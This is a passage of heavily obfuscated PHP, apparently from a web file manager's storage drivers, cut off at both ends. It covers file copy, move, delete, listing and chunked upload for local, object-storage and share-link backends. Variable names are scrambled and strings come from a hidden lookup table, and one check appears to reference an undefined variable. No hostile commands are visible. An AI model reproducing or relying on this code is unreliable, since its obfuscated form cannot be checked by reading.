$this->mkdir($this->pathFather($¾’ßîÄ)); $Ï¨áê³“ = $this->iconvSystem($Ï¨áê³“); $¾’ßîÄ = $this->iconvSystem($¾’ßîÄ); $Õä¾É®Ô = copy_64($Ï¨áê³“, $¾’ßîÄ); @chmod($¾’ßîÄ, $this->pathAuth); if ($Õä¾É®Ô) { return $this->getPathOuter($¾’ßîÄ); } $this->writeLog(__FUNCTION__ . $_SERVER[øşô´çË][1654], !0); return !1; } public function moveFile($ë‹üï¸°, $¼Èù¼¤ä) { $this->mkdir($this->pathFather($¼Èù¼¤ä)); $ë‹üï¸° = $this->iconvSystem($ë‹üï¸°); $¼Èù¼¤ä = $this->iconvSystem($¼Èù¼¤ä); $öãÍÙº = intval(@rename($ë‹üï¸°, $¼Èù¼¤ä)); if (!$öãÍÙº) { if ($öãÍÙº = intval(@copy_64($ë‹üï¸°, $¼Èù¼¤ä))) { @unlink($ë‹üï¸°); } } @chmod($¼Èù¼¤ä, $this->pathAuth); if ($öãÍÙº) { return $this->getPathOuter($¼Èù¼¤ä); } $this->writeLog(__FUNCTION__ . $_SERVER[øşô´çË][1654], !0); return !1; } public function movePath($ ³†Êç×, $É¨²¥ÒÕ, $ê‡¢¾¦ı = false) { $œèãÛçÀ =& $_SERVER[øşô´çË]; $ ³†Êç× = $this->iconvSystem($ ³†Êç×); $É¨²¥ÒÕ = $this->iconvSystem($É¨²¥ÒÕ); $¦×»ä¬® = rtrim($É¨²¥ÒÕ, $œèãÛçÀ[8]) . $œèãÛçÀ[8] . ($ê‡¢¾¦ı ? $ê‡¢¾¦ı : get_path_this($ ³†Êç×)); if (file_exists($¦×»ä¬®)) { return !1; } $úó‡² = intval(@rename($ ³†Êç×, $¦×»ä¬®)); $úó‡² = file_exists($¦×»ä¬®); if ($úó‡²) { return $this->getPathOuter($¦×»ä¬®); } $this->writeLog(__FUNCTION__ . $œèãÛçÀ[1654], !0); return !1; } public function delFile($¦Ú¸³¤) { $¦Ú¸³¤ = $this->iconvSystem($¦Ú¸³¤); if (!@unlink($¦Ú¸³¤)) { @chmod($¦Ú¸³¤, $this->pathAuth); if (@unlink($¦Ú¸³¤)) { return !0; } $this->writeLog(__FUNCTION__ . $_SERVER[øşô´çË][1654], !0); return !1; } return !0; } public function delFolder($õí×À‚ô) { $ˆ³­òß =& $_SERVER[øşô´çË]; $õí×À‚ô = $this->iconvSystem($õí×À‚ô); if (!is_dir($õí×À‚ô)) { return !0; } if (!($’ä®À¨â = opendir($õí×À‚ô))) { return !1; } while (($êÒ¤ôäó = readdir($’ä®À¨â)) !== !1) { if ($êÒ¤ôäó == $ˆ³­òß[10] || $êÒ¤ôäó == $ˆ³­òß[1464]) { continue; } $ñ¿ãËëÒ = $õí×À‚ô . $ˆ³­òß[8] . $êÒ¤ôäó; if (is_file($ñ¿ãËëÒ) || is_link($ñ¿ãËëÒ)) { if (!unlink($ñ¿ãËëÒ)) { chmod($ñ¿ãËëÒ, $this->pathAuth); if (!unlink($ñ¿ãËëÒ)) { return !1; } } } else { if (is_dir($ñ¿ãËëÒ)) { chmod($ñ¿ãËëÒ, $this->pathAuth); $ñ¿ãËëÒ = $this->iconvApp($ñ¿ãËëÒ); if (!$this->delFolder($ñ¿ãËëÒ)) { return !1; } } } } closedir($’ä®À¨â); return rmdir($õí×À‚ô); } public function rename($¿ ’“¸³, $¦˜¿˜Î) { $–«ˆöŞè =& $_SERVER[øşô´çË]; $†™•û¥ƒ = $this->fileNameAuto($this->pathFather($¿ ’“¸³), $¦˜¿˜Î); $†™•û¥ƒ = $this->iconvSystem($†™•û¥ƒ); $¿ ’“¸³ = $this->iconvSystem($¿ ’“¸³); $İË·–‡° = $this->pathFather($¿ ’“¸³); $®Í¡îÄ = rtrim($İË·–‡°, $–«ˆöŞè[8]) . $–«ˆöŞè[8] . $†™•û¥ƒ; $…–’‚ÄÀ = @rename($¿ ’“¸³, $®Í¡îÄ); $®Í¡îÄ = $this->iconvApp($®Í¡îÄ); if ($…–’‚ÄÀ) { return $this->getPathOuter($®Í¡îÄ); } $this->writeLog(__FUNCTION__ . $–«ˆöŞè[1654], !0); return !1; } public function size($Áˆû‰èÚ) { $Áˆû‰èÚ = $this->iconvSystem($Áˆû‰èÚ); return filesize_64($Áˆû‰èÚ); } public function info($¥µùÃ—É) { $¥µùÃ—É = $this->iconvSystem($¥µùÃ—É); if ($this->isFolder($¥µùÃ—É)) { return $this->folderInfo($¥µùÃ—É); } else { if ($this->isFile($¥µùÃ—É)) { return $this->fileInfo($¥µùÃ—É); } } return !1; } protected function infoChildren($ƒ•ë×², &$¹ÚÈÔ·°, $ËÊ˜½É = true) { $Š×âÙ÷ï =& $_SERVER[øşô´çË]; check_abort_echo(); $ƒ•ë×² = rtrim($ƒ•ë×², $Š×âÙ÷ï[8]) . $Š×âÙ÷ï[8]; if ($ËÊ˜½É) { $ƒ•ë×² = $this->iconvSystem($ƒ•ë×²); } if (!($Ş‚­Å = @opendir($ƒ•ë×²))) { return; } while (($ìïƒ™¾­ = readdir($Ş‚­Å)) !== !1) { if ($ìïƒ™¾­ == $Š×âÙ÷ï[10] || $ìïƒ™¾­ == $Š×âÙ÷ï[1464]) { continue; } $Ç“‰ü = $ƒ•ë×² . $ìïƒ™¾­; if (is_file($Ç“‰ü) || is_link($Ç“‰ü)) { $¹ÚÈÔ·°[$Š×âÙ÷ï[90]]++; $¹ÚÈÔ·°[$Š×âÙ÷ï[89]] += filesize_64($Ç“‰ü); } else { if (is_dir($Ç“‰ü)) { $¹ÚÈÔ·°[$Š×âÙ÷ï[91]]++; $this->infoChildren($Ç“‰ü, $¹ÚÈÔ·°, !1); } } } closedir($Ş‚­Å); } private function folderInfo($¸œ‘§Œğ, $óœŞÎµ˜ = false) { $’İ·ÃâŸ =& $_SERVER[øşô´çË]; $¸œ‘§Œğ = rtrim($¸œ‘§Œğ, $’İ·ÃâŸ[8]) . $’İ·ÃâŸ[8]; $…“¦Æ = $this->iconvApp($this->pathThis($¸œ‘§Œğ)); if ($óœŞÎµ˜) { return array($’İ·ÃâŸ[42] => $…“¦Æ, $’İ·ÃâŸ[97] => $this->getPathOuter($¸œ‘§Œğ), $’İ·ÃâŸ[43] => $’İ·ÃâŸ[88]); } $Ú ¬øØ’ = array($’İ·ÃâŸ[42] => $…“¦Æ, $’İ·ÃâŸ[97] => $this->getPathOuter($¸œ‘§Œğ), $’İ·ÃâŸ[43] => $’İ·ÃâŸ[88], $’İ·ÃâŸ[241] => @filectime($¸œ‘§Œğ), $’İ·ÃâŸ[98] => @filemtime($¸œ‘§Œğ), $’İ·ÃâŸ[1658] => @fileatime($¸œ‘§Œğ), $’İ·ÃâŸ[1659] => is_readable($¸œ‘§Œğ), $’İ·ÃâŸ[1660] => is_writable($¸œ‘§Œğ), $’İ·ÃâŸ[1661] => get_mode($¸œ‘§Œğ)); return $Ú ¬øØ’; } private function fileInfo($×—¾‘‚, $§¬ ³é¾ = false) { $ÔÑ‹”” =& $_SERVER[øşô´çË]; $Şè¤­€Ò = $this->iconvApp($this->pathThis($×—¾‘‚)); if ($§¬ ³é¾) { return array($ÔÑ‹””[42] => $Şè¤­€Ò, $ÔÑ‹””[97] => $this->getPathOuter($×—¾‘‚), $ÔÑ‹””[43] => $ÔÑ‹””[240], $ÔÑ‹””[89] => $this->size($×—¾‘‚), $ÔÑ‹””[176] => $this->ext($Şè¤­€Ò)); } $…§öÒ‡ = array($ÔÑ‹””[42] => $Şè¤­€Ò, $ÔÑ‹””[97] => $this->getPathOuter($×—¾‘‚), $ÔÑ‹””[43] => $ÔÑ‹””[240], $ÔÑ‹””[241] => @filectime($×—¾‘‚), $ÔÑ‹””[98] => @filemtime($×—¾‘‚), $ÔÑ‹””[1658] => @fileatime($×—¾‘‚), $ÔÑ‹””[89] => $this->size($×—¾‘‚), $ÔÑ‹””[176] => $this->ext($Şè¤­€Ò), $ÔÑ‹””[1659] => is_readable($×—¾‘‚), $ÔÑ‹””[1660] => is_writable($×—¾‘‚), $ÔÑ‹””[1661] => get_mode($×—¾‘‚)); return $…§öÒ‡; } public function exist($ °Şã©•) { $ °Şã©• = $this->iconvSystem($ °Şã©•); return @file_exists($ °Şã©•); } public function isFile($ØÌ£ã±á) { $ØÌ£ã±á = $this->iconvSystem($ØÌ£ã±á); return @is_file($ØÌ£ã±á); } public function isFolder($ßÑß¨ğ¬) { $ßÑß¨ğ¬ = $this->iconvSystem($ßÑß¨ğ¬); return @is_dir($ßÑß¨ğ¬); } public function listPath($½ß¸Ÿ¨, $ĞÏ×Ã = false) { $¥Öß¿Ôã =& $_SERVER[øşô´çË]; $½ß¸Ÿ¨ = $this->iconvSystem($½ß¸Ÿ¨); $½ß¸Ÿ¨ = rtrim($½ß¸Ÿ¨, $¥Öß¿Ôã[8]) . $¥Öß¿Ôã[8]; $ÍÊÔô‘¼ = array($¥Öß¿Ôã[95] => array(), $¥Öß¿Ôã[96] => array()); if (!($ÌØ°Ğ“º = @opendir($½ß¸Ÿ¨))) { return $ÍÊÔô‘¼; } while (($è¶éë¥ï = readdir($ÌØ°Ğ“º)) !== !1) { if ($è¶éë¥ï == $¥Öß¿Ôã[10] || $è¶éë¥ï == $¥Öß¿Ôã[1464]) { continue; } $“À÷ÑÍÑ = $½ß¸Ÿ¨ . $è¶éë¥ï; if (is_file($“À÷ÑÍÑ)) { $ÍÊÔô‘¼[$¥Öß¿Ôã[96]][] = $this->fileInfo($“À÷ÑÍÑ, $ĞÏ×Ã); } else { $ÍÊÔô‘¼[$¥Öß¿Ôã[95]][] = $this->folderInfo($“À÷ÑÍÑ, $ĞÏ×Ã); } } closedir($ÌØ°Ğ“º); return $ÍÊÔô‘¼; } public function listAll($ÙÕİÎù¿, &$ºú‚«†£ = array()) { $óÄ¡ëÁ =& $_SERVER[øşô´çË]; $ÙÕİÎù¿ = $this->iconvSystem($ÙÕİÎù¿); $ÙÕİÎù¿ = rtrim($ÙÕİÎù¿, $óÄ¡ëÁ[8]) . $óÄ¡ëÁ[8]; if (!($ÇÛ»ı®ì = @opendir($ÙÕİÎù¿))) { return $ºú‚«†£; } while (($Ì€ÌŞË = readdir($ÇÛ»ı®ì)) !== !1) { if ($Ì€ÌŞË == $óÄ¡ëÁ[10] || $Ì€ÌŞË == $óÄ¡ëÁ[1464]) { continue; } $ğ¨ÌÒ´ş = $ÙÕİÎù¿ . $Ì€ÌŞË; $šîëÖ™˜ = is_dir($ğ¨ÌÒ´ş) && !is_link($ğ¨ÌÒ´ş) ? 1 : 0; $ğ¨ÌÒ´ş = $šîëÖ™˜ ? $ğ¨ÌÒ´ş . $óÄ¡ëÁ[8] : $ğ¨ÌÒ´ş; $ºú‚«†£[] = array($óÄ¡ëÁ[97] => $this->getPathOuter($ğ¨ÌÒ´ş), $óÄ¡ëÁ[88] => $šîëÖ™˜, $óÄ¡ëÁ[98] => intval(@filemtime($ğ¨ÌÒ´ş)), $óÄ¡ëÁ[89] => $šîëÖ™˜ ? 0 : intval($this->size($ğ¨ÌÒ´ş))); if ($šîëÖ™˜) { $this->listAll($ğ¨ÌÒ´ş, $ºú‚«†£); } } closedir($ÇÛ»ı®ì); return $ºú‚«†£; } public function has($ÊÃ©ü¶ı, $ËÌòœª¯ = false, $Üé§Éû¬ = true) { $¨’ÀÊŒÁ =& $_SERVER[øşô´çË]; $ÊÃ©ü¶ı = $this->iconvSystem($ÊÃ©ü¶ı); $ÊÃ©ü¶ı = rtrim($ÊÃ©ü¶ı, $¨’ÀÊŒÁ[8]) . $¨’ÀÊŒÁ[8]; if (!($œóú­» = @opendir($ÊÃ©ü¶ı))) { return !1; } $éœÊò¨Ë = 0; $Íìê’„ = 0; $ô¶Çâ¾© = 0; while (($ïÒ¢€ = readdir($œóú­»)) !== !1) { if ($ïÒ¢€ == $¨’ÀÊŒÁ[10] || $ïÒ¢€ == $¨’ÀÊŒÁ[1464]) { continue; } $ï¤»•Ó¼ = $ÊÃ©ü¶ı . $ïÒ¢€; if ($ËÌòœª¯) { $ô¶Çâ¾©++; if (@is_file($ï¤»•Ó¼)) { $éœÊò¨Ë++; } else { $Íìê’„++; } if ($ô¶Çâ¾© > 10000) { break; } continue; } if ($Üé§Éû¬) { if (@is_file($ï¤»•Ó¼)) { return !0; } } else { if (@is_dir($ï¤»•Ó¼ . $¨’ÀÊŒÁ[8])) { return !0; } } } closedir($œóú­»); if ($ËÌòœª¯) { return array($¨’ÀÊŒÁ[249] => $éœÊò¨Ë, $¨’ÀÊŒÁ[250] => $Íìê’„); } return !1; } public function hashSimple($²ÄÉÑÔÌ) { $äÂÖËİ =& $_SERVER[øşô´çË]; if (!$²ÄÉÑÔÌ) { return md5($äÂÖËİ[12]); } $²ÄÉÑÔÌ = $this->iconvSystem($²ÄÉÑÔÌ); $“Á™ò½ß = $this->size($²ÄÉÑÔÌ); $¡ê¼¤½Å = 200; $ºšæ÷²ç = 50; if ($“Á™ò½ß <= $¡ê¼¤½Å * $ºšæ÷²ç) { return $this->hashMd5($²ÄÉÑÔÌ) . $“Á™ò½ß; } $ıÌâ¶²¥ = $äÂÖËİ[12]; $¬Â‘Ø = intval($“Á™ò½ß / $ºšæ÷²ç); $’´ÚÂ¸Ò = fopen($²ÄÉÑÔÌ, $äÂÖËİ[1662]); if (!$’´ÚÂ¸Ò) { return $ıÌâ¶²¥; } for ($â”Ò‚®Å = 0; $â”Ò‚®Å < $ºšæ÷²ç; $â”Ò‚®Å++) { fseek_64($’´ÚÂ¸Ò, $¬Â‘Ø * $â”Ò‚®Å); $ıÌâ¶²¥ .= fread($’´ÚÂ¸Ò, $¡ê¼¤½Å); } fseek_64($’´ÚÂ¸Ò, $“Á™ò½ß - $¡ê¼¤½Å); $ıÌâ¶²¥ .= fread($’´ÚÂ¸Ò, $¡ê¼¤½Å); fclose($’´ÚÂ¸Ò); return md5($ıÌâ¶²¥) . $“Á™ò½ß; } public function getContent($Á±„Šß) { $Á±„Šß = $this->iconvSystem($Á±„Šß); return file_get_contents($Á±„Šß); } public function setContent($—Ü‡ïçµ, $®ğÏšÂ = '') { $—Ü‡ïçµ = $this->iconvSystem($—Ü‡ïçµ); $ø÷«øö€ = @file_put_contents($—Ü‡ïçµ, $®ğÏšÂ, LOCK_EX); if (!$ø÷«øö€) { $this->writeLog(__FUNCTION__ . $_SERVER[øşô´çË][1654], !0); } clearstatcache(); @chmod($—Ü‡ïçµ, $this->pathAuth); return $ø÷«øö€ === !1 ? !1 : !0; } public function fileSubstr($£á±í¼œ, $¬¿èõÌ = 0, $Õèçáå¬ = false) { $Â€¯´À¸ =& $_SERVER[øşô´çË]; $£á±í¼œ = $this->iconvSystem($£á±í¼œ); if ($Õèçáå¬ === !1) { $Õèçáå¬ = $this->size($£á±í¼œ); } if ($Õèçáå¬ <= 0) { return $Â€¯´À¸[12]; } $œ‘§ïÀª = fopen($£á±í¼œ, $Â€¯´À¸[1662]); if (!$œ‘§ïÀª) { return !1; } fseek_64($œ‘§ïÀª, $¬¿èõÌ); $Ÿï“¡– = fread($œ‘§ïÀª, $Õèçáå¬); fclose($œ‘§ïÀª); if (!$Ÿï“¡–) { $this->writeLog(__FUNCTION__ . $Â€¯´À¸[1654], !0); } return $Ÿï“¡–; } public function upload($ ¡ÖÈÚ©, $çƒ†È”å, $Ãş¯ğç = false, $š¨ãğÉì = REPEAT_REPLACE) { if (!$çƒ†È”å || !@file_exists($çƒ†È”å)) { return !1; } if ($Ãş¯ğç) { return $this->moveFile($çƒ†È”å, $ ¡ÖÈÚ©); } return $this->copyFile($çƒ†È”å, $ ¡ÖÈÚ©); } public function setModifyTime($¹ì·§¨ù, $Ÿƒ€‰ŒĞ = '') { @touch($¹ì·§¨ù, intval($Ÿƒ€‰ŒĞ)); } public function download($»àĞÖàœ, $í†ºÈ‘) { return $this->iconvSystem($»àĞÖàœ); } } class PathDriverOBS extends PathDriverBaseS3 { public function __construct($¡ÎÓı¶) { parent::__construct($¡ÎÓı¶); $this->setSignVersion($_SERVER[øşô´çË][257]); } public function fileOutImage($Ì½ÅÙÎÊ, $µÂû¼ùÊ = 250) { $Âñ´³Ú =& $_SERVER[øşô´çË]; if ($this->size($Ì½ÅÙÎÊ) > 1024 * 1024 * 25) { return $this->fileOutImageServer($Ì½ÅÙÎÊ, $µÂû¼ùÊ); } $£”á£­‹ = array($Âñ´³Ú[1663] => $Âñ´³Ú[1664] . $µÂû¼ùÊ . $Âñ´³Ú[1665]); $Å¼»ùå‹ = $this->link($Ì½ÅÙÎÊ, $£”á£­‹); $this->fileOutLink($Å¼»ùå‹); } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($ÌîÑüñ) { parent::__construct($ÌîÑüñ); $this->setSignVersion($_SERVER[øşô´çË][257]); } public function uploadFormData($Òìø‚Ïâ, $çëªÕæÂ = 3600) { return $this->uploadFormDataV2($Òìø‚Ïâ, $çëªÕæÂ); } } goto cÛ“ÍæÌšõ; BÒÄµš‰âå: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($öôìÇé™) { $this->pathParse = $öôìÇé™; } protected function infoParse($ÓóĞ‰¿„, $Ìã¬ ¶ì = false) { $âùÂ¢©Ÿ =& $_SERVER[øşô´çË]; return Action($âùÂ¢©Ÿ[1359])->sharePathInfo($this->pathParse[$âùÂ¢©Ÿ[97]], !0, $Ìã¬ ¶ì); } public function listPath($Ÿ½÷éîİ, $Œì×Î»ä = false) { $ÍÜÓ¥ñ¾ =& $_SERVER[øşô´çË]; $ö¹Ş·û€ = IO::listPath($Ÿ½÷éîİ, $Œì×Î»ä); if (!$ö¹Ş·û€) { return $ö¹Ş·û€; } if (is_array($ö¹Ş·û€[$ÍÜÓ¥ñ¾[969]])) { $´Ëç™ãÊ = Action($ÍÜÓ¥ñ¾[1545])->parsePathChildren($ö¹Ş·û€[$ÍÜÓ¥ñ¾[969]], array($ÍÜÓ¥ñ¾[519] => $Ÿ½÷éîİ)); $ö¹Ş·û€[$ÍÜÓ¥ñ¾[969]] = Action($ÍÜÓ¥ñ¾[1359])->shareItemInfo($´Ëç™ãÊ); } foreach ($ö¹Ş·û€ as $µ¥ÌãŸ« => $ß‘åƒÚ‹) { if (!in_array($µ¥ÌãŸ«, array($ÍÜÓ¥ñ¾[96], $ÍÜÓ¥ñ¾[95]))) { continue; } foreach ($ß‘åƒÚ‹ as $¿êÊÂ†ê => $´Ëç™ãÊ) { $´Ëç™ãÊ = Action($ÍÜÓ¥ñ¾[1545])->parsePathChildren($´Ëç™ãÊ, array($ÍÜÓ¥ñ¾[519] => $Ÿ½÷éîİ)); $ö¹Ş·û€[$µ¥ÌãŸ«][$¿êÊÂ†ê] = Action($ÍÜÓ¥ñ¾[1359])->shareItemInfo($´Ëç™ãÊ); } } return $ö¹Ş·û€; } } class PathDriverDriverShareOuter extends PathDriverBase { public function __construct($½Â®éÀŞ) { $ìï¥µŒØ =& $_SERVER[øşô´çË]; parent::__construct(); $this->uploadChunkSize = 1024 * 1024 * 2; $this->pathParse = $½Â®éÀŞ; $Èááà¢ = Model($ìï¥µŒØ[695])->getInfo($½Â®éÀŞ[$ìï¥µŒØ[496]]); $­öä– = _get($Èááà¢, $ìï¥µŒØ[589]); $Ñà˜’ãÂ = Model($ìï¥µŒØ[596])->authMake(_get($Èááà¢, $ìï¥µŒØ[1546])); if (!$Èááà¢) { IO::errorTips(LNG($ìï¥µŒØ[1547]), !1); } if (!$Ñà˜’ãÂ) { IO::errorTips(LNG($ìï¥µŒØ[1548]), !1); } if ($­öä– && is_string($­öä–)) { $­öä– = json_decode($­öä–, !0); } if (!$­öä– || !$Ñà˜’ãÂ) { return; } $this->_config = array($ìï¥µŒØ[1353] => rtrim($½Â®éÀŞ[$ìï¥µŒØ[1353]], $ìï¥µŒØ[8]) . $ìï¥µŒØ[8], $ìï¥µŒØ[1549] => $ìï¥µŒØ[1457] . $­öä–[$ìï¥µŒØ[1550]] . $ìï¥µŒØ[508], $ìï¥µŒØ[585] => $Èááà¢, $ìï¥µŒØ[589] => $­öä–, $ìï¥µŒØ[1551] => $Ñà˜’ãÂ, $ìï¥µŒØ[1552] => substr(APP_HOST, 0, 8) == $ìï¥µŒØ[227], $ìï¥µŒØ[1553] => Model($ìï¥µŒØ[600])->authCheck($Ñà˜’ãÂ[$ìï¥µŒØ[512]], AuthModel::AUTH_VIEW, !1), $ìï¥µŒØ[1554] => Model($ìï¥µŒØ[600])->authCheck($Ñà˜’ãÂ[$ìï¥µŒØ[512]], AuthModel::AUTH_EDIT, !1)); $this->authToken = $this->requestAuthToken(); } public function allowAction($ù”†½¯) { $Á³°¿§˜ =& $_SERVER[øşô´çË]; $Á²Œıßï = $this->_config; if (!$Á²Œıßï) { return !1; } $Ûîí§Ò = array($Á³°¿§˜[1555] => $Á²Œıßï[$Á³°¿§˜[1553]], $Á³°¿§˜[1556] => $Á²Œıßï[$Á³°¿§˜[1553]], $Á³°¿§˜[1381] => $Á²Œıßï[$Á³°¿§˜[1553]], $Á³°¿§˜[117] => $Á²Œıßï[$Á³°¿§˜[1554]], $Á³°¿§˜[1557] => $Á²Œıßï[$Á³°¿§˜[1554]], $Á³°¿§˜[1330] => $Á²Œıßï[$Á³°¿§˜[1554]], $Á³°¿§˜[1558] => !1, $Á³°¿§˜[438] => !1, $Á³°¿§˜[1559] => !1, $Á³°¿§˜[1560] => !1); return $Ûîí§Ò[$ù”†½¯]; } public function listPath($ÃÎÜ‚³, $™½È­Ğ = false) { return $this->request($_SERVER[øşô´çË][1561], array($ÃÎÜ‚³)); } public function setContent($§Ó–¦Î, $•‡ö¿Óâ = '') { return $this->request($_SERVER[øşô´çË][1562], array($§Ó–¦Î, $•‡ö¿Óâ)); } public function getContent($è˜Á´«Ñ) { return $this->_fileSubstr($è˜Á´«Ñ); } public function fileSubstr($ù‚£ÎÔŠ, $†ë˜ä½¶, $Òóá„“) { return $this->_fileSubstr($ù‚£ÎÔŠ, $†ë˜ä½¶, $Òóá„“); } public function download($¦©¹õ×õ, $ÅäØñŞ) { return $this->_download($¦©¹õ×õ, $ÅäØñŞ); } public function isFileOutServer() { return !1; } public function fileOut($·Û³ôŸ, $ËÖàğ½Ñ = false, $ïäÔ§³¼ = false, $ê»áÅî = '') { $·åª‰’® =& $_SERVER[øşô´çË]; $this->fileOutLink($this->_fileLink($·Û³ôŸ, ($ê»áÅî ? $·åª‰’®[1563] . $ê»áÅî : $·åª‰’®[12]) . ($ËÖàğ½Ñ ? $·åª‰’®[1564] : $·åª‰’®[12]))); } public function fileOutImage($×ä‡ñ‡±, $Ú¹´´‹æ = 250) { $this->fileOutLink($this->_fileLink($×ä‡ñ‡±, $_SERVER[øşô´çË][1565] . $Ú¹´´‹æ)); } public function fileOutLink($ü²à³±ş) { header($_SERVER[øşô´çË][182] . $this->urlAuto($ü²à³±ş)); die; } public function exist($”¶Ô‘™³) { $˜êõœÜ© = $this->_info($”¶Ô‘™³); return $˜êõœÜ© ? !0 : !1; } public function isFile($Ê„…¹êç) { $’ÇºÇ¦ =& $_SERVER[øşô´çË]; $ÄÇÊû¾« = $this->_info($Ê„…¹êç); return _get($ÄÇÊû¾«, $’ÇºÇ¦[43], $’ÇºÇ¦[12]) == $’ÇºÇ¦[240]; } public function isFolder($“Ñ¥¾·) { $÷¤“‡·æ =& $_SERVER[øşô´çË]; $¯áİõÄª = $this->_info($“Ñ¥¾·); return _get($¯áİõÄª, $÷¤“‡·æ[43], $÷¤“‡·æ[12]) == $÷¤“‡·æ[88]; } public function size($½” É’ ) { $üÖ×ßÎ = $this->_info($½” É’ ); return _get($üÖ×ßÎ, $_SERVER[øşô´çË][89], 0); } public function info($©ÜÃ·î) { return $this->_info($©ÜÃ·î); } public function infoAuth($©Í¦‘ğò) { return $this->_info($©Í¦‘ğò); } public function infoFull($ôÓ®ÛíĞ) { return $this->_info($ôÓ®ÛíĞ); } public function infoFullSimple($™î÷€¥) { return $this->_info($™î÷€¥); } public function infoWithChildren($ì’şË½À) { return $this->_info($ì’şË½À, !0); } public function has($’õ¶›«Ÿ, $¤ÑÇÀ— = false, $ÅëÎ¸Èè = false) { $ÙÄÆ­úß =& $_SERVER[øşô´çË]; $ìŠÆï À = $this->_info($’õ¶›«Ÿ); if (!$ìŠÆï À) { return !1; } if ($¤ÑÇÀ—) { return array($ÙÄÆ­úß[249] => $ìŠÆï À[$ÙÄÆ­úß[249]], $ÙÄÆ­úß[250] => $ìŠÆï À[$ÙÄÆ­úß[250]]); } return $ö«æ©¸ ? $ìŠÆï À[$ÙÄÆ­úß[249]] > 0 : $ìŠÆï À[$ÙÄÆ­úß[250]] > 0; } public function mkfile($»Â«í«í, $´Îù¯ä = '', $¡à”åâ‡ = REPEAT_RENAME) { return $this->request($_SERVER[øşô´çË][1538], array($»Â«í«í, $´Îù¯ä, $¡à”åâ‡)); } public function mkdir($™…Ê¥œ×, $ô·ôÖ„Î = REPEAT_SKIP) { return $this->request($_SERVER[øşô´çË][1539], array($™…Ê¥œ×, $ô·ôÖ„Î)); } public function remove($Ä˜¾³ İ) { return $this->request($_SERVER[øşô´çË][1330], array($Ä˜¾³ İ)); } public function rename($»¿êÔ•Ì, $ˆÚ°Ø¤æ) { return $this->request($_SERVER[øşô´çË][1542], array($»¿êÔ•Ì, $ˆÚ°Ø¤æ)); } public function moveSameAllow() { } public function copy($ğåÃÍûõ, $ğ­¸ĞÆì, $íó®Šï = REPEAT_REPLACE, $Áéƒ»‘ß = false) { return $this->request($_SERVER[øşô´çË][650], array($ğåÃÍûõ, $ğ­¸ĞÆì, $íó®Šï)); } public function move($„ÈŞÑ÷´, $Û¹â’‚œ, $úìÏŒâº = REPEAT_REPLACE, $‘£‰Ú¯© = false) { return $this->request($_SERVER[øşô´çË][652], array($„ÈŞÑ÷´, $Û¹â’‚œ, $úìÏŒâº)); } public function uploadLink($ÃØ´‘½, $ô¬°Íî = 0) { $ø½°ì½ã =& $_SERVER[øşô´çË]; $×¾Õ‡À× = IO::init($GLOBALS[$ø½°ì½ã[7]][$ø½°ì½ã[97]]); $Ñúå÷© = $this->pathApiEncode($×¾Õ‡À×->path); $Ì¬÷â¤¯ = $this->requestMakeUrl($ø½°ì½ã[1566], array($ø½°ì½ã[97] => $Ñúå÷©)); return array($ø½°ì½ã[1567] => $Ì¬÷â¤¯); } public function upload($×—¼Šøò, $áã¶™Ïù, $ù–ÄÙã¯ = false, $ø¬Í‰Èî = REPEAT_REPLACE) { $Ò€ÔÁ¡† =& $_SERVER[øşô´çË]; if (filesize($áã¶™Ïù) < $this->uploadChunkSize) { return $this->request($Ò€ÔÁ¡†[117], array($×—¼Šøò, $áã¶™Ïù, $ø¬Í‰Èî)); } $¢’½‰÷Ò = $this->uploadHashCheck($×—¼Šøò, $áã¶™Ïù, $ø¬Í‰Èî); if ($¢’½‰÷Ò) { return $¢’½‰÷Ò; } $¶åãÍú = @filesize($áã¶™Ïù); $Ğùº¦• = $this->uploadChunkSize; $ûÀ‹Š¸Ÿ = ceil($¶åãÍú / $Ğùº¦•); $ÑØ›á¡ß = 0; while ($ÑØ›á¡ß < $ûÀ‹Š¸Ÿ) { $Ì§×†æÕ = IO::fileSubstr($áã¶™Ïù, $ÑØ›á¡ß * $Ğùº¦•, $Ğùº¦•); $íÈ¦®¬™ = $this->tempFile($Ò€ÔÁ¡†[12], $Ì§×†æÕ); $…«¨È½ù = array($Ò€ÔÁ¡†[89] => $¶åãÍú, $Ò€ÔÁ¡†[1568] => $Ğùº¦•, $Ò€ÔÁ¡†[1569] => $ûÀ‹Š¸Ÿ, $Ò€ÔÁ¡†[1570] => $ÑØ›á¡ß); $õõ‡µä” = $this->uploadSend($×—¼Šøò, $íÈ¦®¬™, $…«¨È½ù, $ø¬Í‰Èî); $ÑØ›á¡ß++; if (!$õõ‡µä”) { return !1; } } if (!is_array($õõ‡µä”) || empty($õõ‡µä”[$Ò€ÔÁ¡†[604]])) { return !1; } return $this->pathApiDecode($õõ‡µä”[$Ò€ÔÁ¡†[604]]); } private function uploadHashCheck($ÍéÏû¥¶, $­´óªÏÂ, $äŠîºÎÎ) { $åâç…¹ =& $_SERVER[øşô´çË]; $ÏÕÇû‚Ú = IO::hashSimple($­´óªÏÂ); $ä˜åà˜ = array($åâç…¹[1571] => $åâç…¹[1572], $åâç…¹[1531] => $ÏÕÇû‚Ú); $š˜¾©ñ¡ = $this->uploadSend($ÍéÏû¥¶, $åâç…¹[12], $ä˜åà˜, $äŠîºÎÎ); $•¿Şø  = _get($š˜¾©ñ¡, $åâç…¹[604], array()); $À…Ó²”ò = _get($•¿Şø , $åâç…¹[1573]); if (!is_array($À…Ó²”ò) || !$À…Ó²”ò[$åâç…¹[572]]) { return !1; } $‹èù‚Æ‚ = IO::hashMd5($­´óªÏÂ); if ($À…Ó²”ò[$åâç…¹[572]] != $‹èù‚Æ‚) { return !1; } if ($š˜¾©ñ¡[$åâç…¹[604]][$åâç…¹[1574]]) { $this->uploadChunkSize = $š˜¾©ñ¡[$åâç…¹[604]][$åâç…¹[1574]]; } $ä˜åà˜ = array($åâç…¹[1571] => $åâç…¹[1575], $åâç…¹[1532] => $‹èù‚Æ‚, $åâç…¹[1531] => $ÏÕÇû‚Ú); $š˜¾©ñ¡ = $this->uploadSend($ÍéÏû¥¶, $åâç…¹[12], $ä˜åà˜, $äŠîºÎÎ); if (!is_array($š˜¾©ñ¡) || empty($š˜¾©ñ¡[$åâç…¹[604]])) { return !1; } return $this->pathApiDecode($š˜¾©ñ¡[$åâç…¹[604]]); } private function uploadSend($¹„§Öš’, $ÙÕ¼“ÖÏ, $‚Ü¨ÍÒÊ, $Çôø–¦ = '') { $ÇÅˆÈØ— =& $_SERVER[øşô´çË]; 